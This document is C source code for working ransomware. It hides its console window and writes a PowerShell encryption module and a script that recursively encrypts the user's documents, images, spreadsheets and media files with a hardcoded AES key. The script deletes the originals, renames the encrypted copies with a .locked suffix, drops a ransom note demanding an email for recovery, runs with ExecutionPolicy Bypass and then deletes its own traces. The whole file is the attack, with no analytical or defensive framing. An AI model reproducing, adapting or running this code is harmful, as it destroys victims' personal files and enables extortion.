//Cipher Module adapted from FileCryptography Module by Tyler Siegrist.
int main(int argc, char *argv[])
{
  ShowWindow (GetConsoleWindow(), SW_HIDE);

   char command[11000];

 strcpy( command, "cmd.exe /c mkdir %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules\\Cipher & cd %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules\\Cipher & echo function New-CryptographyKey() { > Cipher.psm1 & echo [CmdletBinding()] >> Cipher.psm1 & echo  [OutputType([System.Security.SecureString])] >> Cipher.psm1 & echo [OutputType([String], ParameterSetName='PlainText')] >> Cipher.psm1 & echo Param([Parameter(Mandatory=$false, Position=1)] >> Cipher.psm1 & echo     [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')] >> Cipher.psm1 & echo     [String]$Algorithm='AES', >> Cipher.psm1 & echo     [Parameter(Mandatory=$false, Position=2)] >> Cipher.psm1 & echo     [Int]$KeySize, >> Cipher.psm1 & echo     [Parameter(ParameterSetName='PlainText')] >> Cipher.psm1 & echo     [Switch]$AsPlainText) >> Cipher.psm1 & echo     Process    { >> Cipher.psm1 & echo         try        { >> Cipher.psm1 & echo             $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm) >> Cipher.psm1 & echo             if($PSBoundParameters.ContainsKey('KeySize')){ >> Cipher.psm1 & echo                 $Crypto.KeySize = $KeySize             } >> Cipher.psm1 & echo             $Crypto.GenerateKey() >> Cipher.psm1 & echo             if($AsPlainText)            { >> Cipher.psm1 & echo                 return [System.Convert]::ToBase64String($Crypto.Key) } >> Cipher.psm1 & echo             else            { >> Cipher.psm1 & echo                 return [System.Convert]::ToBase64String($Crypto.Key) ^| ConvertTo-SecureString -AsPlainText -Force            }        } >> Cipher.psm1 & echo         catch        {            Write-Error $_         } } } >> Cipher.psm1 & echo Function Protect-File  { >> Cipher.psm1 & echo [CmdletBinding(DefaultParameterSetName='SecureString')] >> Cipher.psm1 & echo [OutputType([System.IO.FileInfo[]])] >> Cipher.psm1 & echo Param([Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]  >> Cipher.psm1 & echo     [Alias('PSPath','LiteralPath')] >> Cipher.psm1 & echo     [string[]]$FileName,  >> Cipher.psm1 & echo     [Parameter(Mandatory=$false, Position=2)]  >> Cipher.psm1 & echo     [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')] >> Cipher.psm1 & echo     [String]$Algorithm = 'AES', >> Cipher.psm1 & echo     [Parameter(Mandatory=$false, Position=3, ParameterSetName='SecureString')] >> Cipher.psm1 & echo     [System.Security.SecureString]$Key = (New-CryptographyKey -Algorithm $Algorithm), >> Cipher.psm1 & echo     [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')] >> Cipher.psm1 & echo     [String]$KeyAsPlainText, >> Cipher.psm1 & echo     [Parameter(Mandatory=$false, Position=4)] >> Cipher.psm1 & echo     [System.Security.Cryptography.CipherMode]$CipherMode, >> Cipher.psm1 & echo     [Parameter(Mandatory=$false, Position=5)] >> Cipher.psm1  & echo     [System.Security.Cryptography.PaddingMode]$PaddingMode, >> Cipher.psm1 & echo     [Parameter(Mandatory=$false, Position=6)] >> Cipher.psm1 & echo     [String]$Suffix = \".$Algorithm\", >> Cipher.psm1 & echo     [Parameter()] >> Cipher.psm1 & echo     [Switch]$RemoveSource) >> Cipher.psm1 & echo     Begin    { try        { >> Cipher.psm1 & echo             if($PSCmdlet.ParameterSetName -eq 'PlainText') {  >> Cipher.psm1 & echo                 $Key = $KeyAsPlainText ^| ConvertTo-SecureString -AsPlainText -Force}  >> Cipher.psm1 & echo             $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key) >> Cipher.psm1 & echo             $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)) >> Cipher.psm1 & echo             $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm) >> Cipher.psm1 & echo             if($PSBoundParameters.ContainsKey('CipherMode')){ >> Cipher.psm1  & echo                 $Crypto.Mode = $CipherMode } >> Cipher.psm1 & echo             if($PSBoundParameters.ContainsKey('PaddingMode')){ >> Cipher.psm1 & echo                 $Crypto.Padding = $PaddingMode } >> Cipher.psm1 & echo             $Crypto.KeySize = $EncryptionKey.Length*8 >> Cipher.psm1 & echo             $Crypto.Key = $EncryptionKey } >> Cipher.psm1 & echo         Catch   {  Write-Error $_ -ErrorAction Stop       }  } >> Cipher.psm1 & echo     Process    { >> Cipher.psm1 & echo         $Files = Get-Item -LiteralPath $FileName >> Cipher.psm1 & echo          ForEach($File in $Files)        { $DestinationFile = $File.FullName + $Suffix >> Cipher.psm1 & echo             Try       { >> Cipher.psm1 & echo                 $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open) >> Cipher.psm1 & echo                 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create) >> Cipher.psm1 & echo                 $Crypto.GenerateIV() >> Cipher.psm1  & echo                 $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4) >> Cipher.psm1 & echo                 $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length) >> Cipher.psm1 & echo                 $Transform = $Crypto.CreateEncryptor() >> Cipher.psm1 & echo                 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write) >> Cipher.psm1 & echo                 $FileStreamReader.CopyTo($CryptoStream) >> Cipher.psm1 & echo                 $CryptoStream.FlushFinalBlock() >> Cipher.psm1 & echo                 $CryptoStream.Close() >> Cipher.psm1 & echo                 $FileStreamReader.Close() >> Cipher.psm1 & echo                 $FileStreamWriter.Close() >> Cipher.psm1 & echo                 if($RemoveSource){Remove-Item -LiteralPath $File.FullName} >> Cipher.psm1 & echo                 $result = Get-Item $DestinationFile >> Cipher.psm1 & echo                 $result ^| Add-Member -MemberType NoteProperty -Name SourceFile -Value $File.FullName >> Cipher.psm1 & echo                 $result ^| Add-Member -MemberType NoteProperty -Name Algorithm -Value $Algorithm >> Cipher.psm1 & echo                 $result ^| Add-Member -MemberType NoteProperty -Name Key -Value $Key >> Cipher.psm1 & echo                 $result ^| Add-Member -MemberType NoteProperty -Name CipherMode -Value $Crypto.Mode >> Cipher.psm1 & echo                 $result ^| Add-Member -MemberType NoteProperty -Name PaddingMode -Value $Crypto.Padding >> Cipher.psm1 & echo                 $result            } >> Cipher.psm1 & echo             Catch   {  Write-Error $_ >> Cipher.psm1 & echo                 If($FileStreamWriter) >> Cipher.psm1 & echo                 {   $FileStreamWriter.Close() >> Cipher.psm1 & echo                     Remove-Item -LiteralPath $DestinationFile -Force } >> Cipher.psm1 & echo                 Continue >> Cipher.psm1 & echo             }   Finally  {  if($CryptoStream){$CryptoStream.Close()} >> Cipher.psm1 & echo                 if($FileStreamReader){$FileStreamReader.Close()} >> Cipher.psm1 & echo                 if($FileStreamWriter){$FileStreamWriter.Close()}  }  }   } } >> Cipher.psm1 &  echo Import-Module Cipher > cry.ps1 & echo $files = get-childitem $home -recurse -Include  *.gif, *.jpg, *.xls, *.doc, *.pdf, *.wav, *.ppt, *.txt, *.png, *.bmp, *.mp3, *.mp4, *.avi ^| where {^! $_.PSIsContainer} >> cry.ps1 & echo foreach ($file in $files) { Protect-File $file -Algorithm AES -KeyAsPlainText secretkey -Suffix '.locked' -RemoveSource } >> cry.ps1 & echo  echo 'Your personal files have been encrypted, send an email to email_rescue to recover them. Your ID: your_id' ^> $home\\Desktop\\Readme_now.txt >> cry.ps1 & echo start $home\\Desktop\\Readme_now.txt >> cry.ps1 & exit");
 system(command);
 strcpy(command, "cmd.exe /c cd %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules\\Cipher & echo Remove-Item -path $home\\Documents\\WindowsPowerShell\\Modules\\Cipher\\* >> %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules\\Cipher\\cry.ps1 & powershell -ExecutionPolicy ByPass -File %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules\\Cipher\\cry.ps1 & exit");

 system(command);

  return 0;
}
